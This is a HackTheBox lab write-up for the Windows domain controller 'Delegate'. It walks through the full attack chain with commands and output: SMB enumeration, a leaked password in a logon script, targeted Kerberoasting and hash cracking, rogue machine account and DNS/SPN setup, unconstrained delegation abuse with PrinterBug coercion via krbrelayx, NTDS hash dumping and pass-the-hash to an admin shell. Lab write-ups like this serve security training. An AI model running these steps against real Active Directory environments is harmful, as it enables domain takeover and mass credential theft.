---
layout: post
title: "[HTB] Delegate"
description: "[Machine] - Medium difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---

![](/img/htb_img/Delegate_img/img1.png)

- OS: Windows
- Release Date: 11 Sep 2025
- Difficulty: Medium

# Enumeration
I always start by mapping the attack surface fast, then pivot into focused enumeration based on what the ports say about the role of the host.
## Nmap recon
```
❯ sudo nmap -p- --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 16:58 CEST
Stats: 0:12:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 69.17% done; ETC: 17:15 (0:05:28 remaining)
Nmap scan report for 10.129.xx.xx
Host is up (0.12s latency).
Not shown: 65508 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
55728/tcp open  unknown
57954/tcp open  unknown
57955/tcp open  unknown
57960/tcp open  unknown
57972/tcp open  unknown
65283/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 963.01 seconds
```

Scripts and versions.
```
❯ extractPorts allports

       │ File: extractPorts.tmp
───────┼──────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.129.xx.xx
   5   │     [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49669,49670,55728,57954,57955,57960,57972,65283
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴──────────────────────────────────────────────────────────────────

❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49669,49670,55728,57954,57955,57960,57972,65283 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 17:18 CEST
Nmap scan report for DC1.delegate.vl (10.129.xx.xx)
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-04 15:18:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-04T15:20:03+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-04T15:19:24+00:00
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2025-10-03T14:49:56
|_Not valid after:  2026-04-04T14:49:56
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
55728/tcp open  msrpc         Microsoft Windows RPC
57954/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57955/tcp open  msrpc         Microsoft Windows RPC
57960/tcp open  msrpc         Microsoft Windows RPC
57972/tcp open  msrpc         Microsoft Windows RPC
65283/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-04T15:19:26
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.92 seconds
```

**Why these ports?** The first pass often screams “Domain Controller” when you see the Kerberos/LDAP/GC trio (88/389/3268) plus AD Web Services (9389), WinRM (5985/47001), RDP (3389) and SMB (445). That combination tells me:

- We’re likely in an **Active Directory** environment (good—rich attack graph).
- **SMB** is the front door to low-hanging fruit (shares, guest/NULL access, RID cycling).
- **Kerberos** is in play, so all the roasting/delegation/RBCD toys might land.

To make life easier for Kerberos/SPN tools, add target hostnames into `/etc/hosts` early:
```bash
# nxc can auto-generate a handy hosts line
❯ nxc smb $target --generate-hosts-file hosts
SMB         10.129.xx.xx  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)

❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

## SMB Enumeration
Goal here: squeeze any unauthenticated access for **users, shares, and files** that leak credentials.
### Check guest/NULL SMB access
```bash
# NULL / guest auth to list shares and attempt RID cycling
❯ nxc smb dc1.delegate.vl -u '' -p '' --shares
[*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)
[+] delegate.vl\: 
[-] Error enumerating shares: STATUS_ACCESS_DENIED

❯ nxc smb dc1.delegate.vl -u guest -p '' --rid-brute
[*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)
[+] delegate.vl\guest: 
498: DELEGATE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: DELEGATE\Administrator (SidTypeUser)
501: DELEGATE\Guest (SidTypeUser)
502: DELEGATE\krbtgt (SidTypeUser)
512: DELEGATE\Domain Admins (SidTypeGroup)
513: DELEGATE\Domain Users (SidTypeGroup)
514: DELEGATE\Domain Guests (SidTypeGroup)
515: DELEGATE\Domain Computers (SidTypeGroup)
516: DELEGATE\Domain Controllers (SidTypeGroup)
517: DELEGATE\Cert Publishers (SidTypeAlias)
518: DELEGATE\Schema Admins (SidTypeGroup)
519: DELEGATE\Enterprise Admins (SidTypeGroup)
520: DELEGATE\Group Policy Creator Owners (SidTypeGroup)
521: DELEGATE\Read-only Domain Controllers (SidTypeGroup)
522: DELEGATE\Cloneable Domain Controllers (SidTypeGroup)
525: DELEGATE\Protected Users (SidTypeGroup)
526: DELEGATE\Key Admins (SidTypeGroup)
527: DELEGATE\Enterprise Key Admins (SidTypeGroup)
553: DELEGATE\RAS and IAS Servers (SidTypeAlias)
571: DELEGATE\Allowed RODC Password Replication Group (SidTypeAlias)
572: DELEGATE\Denied RODC Password Replication Group (SidTypeAlias)
1000: DELEGATE\DC1$ (SidTypeUser)
1101: DELEGATE\DnsAdmins (SidTypeAlias)
1102: DELEGATE\DnsUpdateProxy (SidTypeGroup)
1104: DELEGATE\A.Briggs (SidTypeUser)
1105: DELEGATE\b.Brown (SidTypeUser)
1106: DELEGATE\R.Cooper (SidTypeUser)
1107: DELEGATE\J.Roberts (SidTypeUser)
1108: DELEGATE\N.Thompson (SidTypeUser)
1121: DELEGATE\delegation admins (SidTypeGroup)
```
If RID cycling returns a user list, save it for later (spray/kerberoast). If guest can list shares, step in.
```
❯ cat users
───────┬────────────────────
       │ File: users
───────┼────────────────────
   1   │ Administrator
   2   │ Guest
   3   │ krbtgt
   4   │ DC1$
   5   │ A.Briggs
   6   │ b.Brown
   7   │ R.Cooper
   8   │ J.Roberts
   9   │ N.Thompson
───────┴────────────────────
```

### Browse shares and look for scripts / config
```
❯ nxc smb dc1.delegate.vl -u guest -p '' --shares

[*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)
[+] delegate.vl\guest: 
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
```

```bash
❯ smbclient -N //dc1.delegate.vl/SYSVOL
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Sep  9 15:52:30 2023
  ..                                  D        0  Sat Aug 26 11:39:25 2023
  delegate.vl                        Dr        0  Sat Aug 26 11:39:25 2023

		4652287 blocks of size 4096. 1010159 blocks available
smb: \> cd delegate.vl
smb: \delegate.vl\> dir
  .                                   D        0  Sat Aug 26 11:45:45 2023
  ..                                  D        0  Sat Aug 26 11:39:25 2023
  DfsrPrivate                      DHSr        0  Sat Aug 26 11:45:45 2023
  Policies                            D        0  Sat Aug 26 11:39:30 2023
  scripts                             D        0  Sat Aug 26 14:45:24 2023

		4652287 blocks of size 4096. 1010159 blocks available
smb: \delegate.vl\> cd scripts
smb: \delegate.vl\scripts\> ls
  .                                   D        0  Sat Aug 26 14:45:24 2023
  ..                                  D        0  Sat Aug 26 11:45:45 2023
  users.bat                           A      159  Sat Aug 26 14:54:29 2023

		4652287 blocks of size 4096. 1010159 blocks available
smb: \delegate.vl\scripts\> get users.bat
getting file \delegate.vl\scripts\users.bat of size 159 as users.bat (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

```
❯ cat users.bat
───────┬──────────────────────────────────────────────────────────────────
       │ File: users.bat
───────┼──────────────────────────────────────────────────────────────────
   1   │ rem @echo off
   2   │ net use * /delete /y
   3   │ net use v: \\dc1\development 
   4   │ 
   5   │ if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
───────┴──────────────────────────────────────────────────────────────────
```

These “IT helper” batch files are gold because they frequently mount a drive with embedded creds. In this case the batch file contained a conditional mapping for a specific domain user and leaked a cleartext password. Try it directly against common services:

```bash
# Validate creds everywhere we can
❯ nxc smb dc1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123'
[*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)
[+] delegate.vl\A.Briggs:P4ssw0rd1#123

❯ nxc ldap dc1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' --kerberos
[*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert)
[+] delegate.vl\A.Briggs:P4ssw0rd1#123

❯ nxc winrm dc1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123'
[*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
[-] delegate.vl\A.Briggs:P4ssw0rd1#123
```

Even if WinRM/RDP don’t bite, **valid domain creds** are everything. With those, we pivot to graphing the domain.

## Mapping AD with BloodHound
I like redundant collection: two collectors sometimes spot different edges.
```bash
# nxc collector
❯ nxc ldap dc1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' \
  --bloodhound -c All --dns-server $target
[*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert) 
[+] delegate.vl\A.Briggs:P4ssw0rd1#123 
Resolved collection methods: trusts, psremote, objectprops, rdp, session, acl, localadmin, dcom, container, group
Done in 0M 28S
Compressing output into /home/kali/.nxc/logs/DC1_10.129.xx.xx_2025-10-04_184912_bloodhound.zip
```

Upload the ZIPs into BloodHound-CE and mark the current user as **owned**. 
![](/img/htb_img/Delegate_img/img2.png)

The edge we care about is an **Outbound Object Control** from the compromised user to another user—specifically **`GenericWrite` over `N.Thompson`**. That’s a perfect setup for **Targeted Kerberoasting**.
![](/img/htb_img/Delegate_img/img3.png)

 Why `GenericWrite` matters: with it, we can add an SPN to the target user (turning them into a service account from Kerberos’ perspective). Once a user has an SPN, requesting a TGS yields a ticket encrypted with their NT hash—i.e., a crackable blob.

# Foothold 
## Targeted Kerberoast
There are two main ways to “take” a user with `GenericWrite`:
1. **Shadow credentials** (add a key to `msDS-KeyCredentialLink`).
2. **Targeted Kerberoast** (add SPN → request TGS → crack → password → shell).
If shadow creds are blocked by hardening, roasting is usually still available.

### Add an SPN and roast
```bash
# One-stop script for the flow
❯ python3 /opt/targetedKerberoast.py -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$baeaa275e64ef3c15ed770a2e789a1c4$465105afcda09c6cfe4c73c13d23f666262a0e1fcaea65244a9aa9c9898c1e7969948d1ee45dba6a9ac59014dbe510014105fd90c22f540329a15fef0d4f9d700ae9fe7a2142c347049e4c96c594cb0ff1cf0233520acbaf630d2cc9ccc8b316b7334557d2967feea166bd9941e88a9cecc68054cdfbe2f4763444540d58b40ec7f156d7fb97ea9b031c08621fbd38eab6afa49065afb2ffb9172d3c0d43268dd2b3310eb2e368fcd75dcd57bd3e66c9ceb1c59588e88b0a8f6b6336c55b6318156d99594b2e7f844625812d067531fb0656afd257baf4275d395753012d7efad671132a90177c43b77407a5893f3288fbd3625bbde6562b2ad54f83444dd3d509c31d6e89a9ca212637b7fb009bad185f2a29ef396f94ccd883edbe11c350f4fc03b6b1261437412d084e867ddd50464042fb0ced1aef5a4527e96dda994f92e6a979aad18d985be2d30cfb71d2472cc2eb5a5dda504af153ad51bca107c49cefbcfc654ea6c25768728045b22841692f7069762624937d4033885ab97868b2872b875082b0bf265fcf352c15de8dd9953f96854de96c62d6622d589b61240bb95328115a0ea9dcf4e5b3eaa5a2103c2cf566f3c69e0e0f86717bacc7d2dfebe60c184a43c3a1406dfa9c0da9e777b30e8f3304664325c09c8c0473141fdf8d28cbb1ad58fa7e5ac07596e63266e5df0b71c5cc8f0a51cbc3e54ae941535fdc8e3869d1fb5c2cb85f061feb7a213f6fde55f26b7db7fe7c89dc6f35dc5706a285ffafd3ce431671760daf435bcbbcbab689ec23b1dfdaf18be1cb41ae4369aca6b0b9f63ec0acdfb2ca9c664840c18b1938a2271db49ac55b6eeec2a7dcac8139fdf9ec911e94da315713b7404b8a9ca1924e47f25c0d58409de6b385d42adfb3f8147b96784b701eede5ffdf512e176e987baf5fac3f95726624dccae91aeb8d49ac7ccaa0b79c45cd3437935c3ab329745e6b007a551265a0d53b0386fc0d34458199b04ece544001764be2baac432cbe75a17d45deec46c6c7b3cee806ced32eced8f0923a98b8b237f308f768e34726e31379094b44e86142c513b3c65d29551f857163dd227f9edf7211b43b52dfb788795267a3bd853b6e922135d68565aa232f024a53fdbbdfe6547f77d5e3591c552eab1c93564261b34062d75ff51b81a22485e7fa59365511eb6c3b1df4062da04725546fcb1e169a80c601f69f22b7307484916dc42a75a7b26c3df3d5b66943014615a3dbfbb705f57cd5bc66c186e2a07aeb8646c63c9ca58b028dfe4f9cc5339f730f98159d94a9a6e39442a3d3082f9e7138a852d8342880b3005502b014b9ffb9468b7963bd5544f103a255ed3e59526e992affc3b736ee3de57fa58a8161c3a033cda9505350675a7e89f20febe2e8b10ec49d8728199485ee0a998f61ca88ec4c93ffc3b6b3b29b1aed13c9819e
```

This will:
- Add an SPN to `N.Thompson` using our `GenericWrite` rights.
- Request a TGS for that SPN.
- Dump a hash in `$krb5tgs$` format for cracking.

### Crack the TGS
```bash
❯ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force
<snip>:KALEB_2341
```

Once cracked, we’ve got **`N.Thompson`’s password**. Check for remote shell access:

```bash
# Python Evil-WinRM client or ruby one — either works
❯ evil-winrm -i dc1.delegate.vl -u N.Thompson -p 'KALEB_2341'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Documents>
```

#### User flag
```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> ls


    Directory: C:\Users\N.Thompson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         10/4/2025   7:51 AM             34 user.txt


*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> type user.txt
<REDACTED>
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop>
```

# Privilege Escalation

```
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop>
```
`SeEnableDelegationPrivilege` -> Escalation

## Delegation
```
❯ netexec ldap dc1.delegate.vl -u A.Briggs -p P4ssw0rd1#123 -M maq
[*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert) 
[+] delegate.vl\A.Briggs:P4ssw0rd1#123 
[*] Getting the MachineAccountQuota
MachineAccountQuota: 10
```

### Add a computer we own
```bash
❯ impacket-addcomputer -computer-name blog -computer-pass 'BlogBlog.123!' -dc-ip $target delegate.vl/N.Thompson:'KALEB_2341'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account blog$ with password BlogBlog.123!.
```

### Add DNS Record
```
❯ uv run --script /opt/krbrelayx/dnstool.py -u 'delegate.vl\blog$' -p 'BlogBlog.123!' --action add --record blog.delegate.vl --data 10.10.xx.xx --type A -dns-ip $target dc1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

```
❯ uv run --script /opt/krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/blog.delegate.vl' -t 'blog$' -dc-ip $target dc1.delegate.vl

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[!] Could not modify object, the server reports a constrained violation
[!] You either supplied a malformed SPN, or you do not have access rights to add this SPN (Validated write only allows adding SPNs matching the hostname)
[!] To add any SPN in the current domain, use --additional to add the SPN via the msDS-AdditionalDnsHostName attribute

# Fix
❯ uv run --script /opt/krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/blog.delegate.vl' -t 'blog$' -dc-ip $target dc1.delegate.vl --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

### Unconstrained delegation
```
❯ bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'blog$' -f TRUSTED_FOR_DELEGATION

[+] ['TRUSTED_FOR_DELEGATION'] property flags added to blog$'s userAccountControlN
```

### Relay
```
❯ python -c "password = 'BlogBlog.123!'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"
a7b49595e6a5481781b67bb0bf52da40
```

```
❯ uv run /opt/krbrelayx/krbrelayx.py -hashes :a7b49595e6a5481781b67bb0bf52da40

[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

Using the `coerce_plus` module:
```
❯ nxc smb dc1.delegate.vl -u 'blog$' -p 'BlogBlog.123!' -M coerce_plus

[*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)
[+] delegate.vl\blog$:BlogBlog.123! 
VULNERABLE, DFSCoerce
VULNERABLE, PetitPotam
VULNERABLE, PrinterBug
VULNERABLE, PrinterBug
VULNERABLE, MSEven
```

```
❯ netexec smb dc1.delegate.vl -u 'blog$' -p 'BlogBlog.123!' -M coerce_plus -o LISTENER=blog.delegate.vl METHOD=PrinterBug

[*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)
[+] delegate.vl\blog$:BlogBlog.123! 
VULNERABLE, PrinterBug
Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
```

Ticket obtained: `DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache`.
### DCSync
```
❯ nxc smb dc1.delegate.vl -u 'blog$' -p 'BlogBlog.123!' --generate-krb5-file krb5.conf

[*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True) (Guest Auth:True) SMB 
[+] delegate.vl\blog$:BlogBlog.123!
```

KRB file:
```
[libdefaults] 
	dns_lookup_kdc = false 
	dns_lookup_realm = false 
	default_realm = DELEGATE.VL 

[realms] 
	DELEGATE.VL = { 
		kdc = dc1.delegate.vl 
		admin_server = dc1.delegate.vl 
		default_domain = delegate.vl 
	} 

[domain_realm] 
	.delegate.vl = DELEGATE.VL 
	delegate.vl = DELEGATE.VL
```

Authing on the machine.
```
❯ KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache nxc smb dc1.delegate.vl --use-kcache 

[*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True) (Guest Auth:True)
[+] DELEGATE.VL\DC1$ from ccache 
```

```
❯ KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache nxc smb dc1.delegate.vl --use-kcache --ntds

[*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True) (Guest Auth:True)
[+] DELEGATE.VL\DC1$ from ccache
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[+] Dumping the NTDS, this could take a while so go grab a redbull...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
```

### Admin shell
```
❯ evil-winrm -i dc1.delegate.vl -u administrator -H c32198ceab4cc695e65045562aa3ee93
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

#### Root flag
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop; type root.txt
<REDACTED>
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```
Special thanks to 0xdf for the PrivEsc.

---
---
